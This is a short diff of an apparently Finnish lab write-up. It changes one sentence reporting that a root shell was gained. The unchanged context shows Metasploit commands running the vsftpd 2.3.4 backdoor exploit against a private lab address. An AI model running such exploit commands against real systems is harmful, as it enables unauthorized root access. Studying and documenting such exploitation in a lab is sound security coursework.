@@ -159,7 +159,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.12.3
 rhosts => 192.168.12.3
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 ````
-Yhteys on luotu ja kirjauduttu root-käyttäjänä.
+Yhteys on luotu ja kirjauduttu root-käyttäjänä shellissä.
 
 <img src="/images/exploit1.png" alt="" title="" width="70%" height="70%">
 <img src="/images/exploit2.png" alt="" title="" width="70%" height="70%">
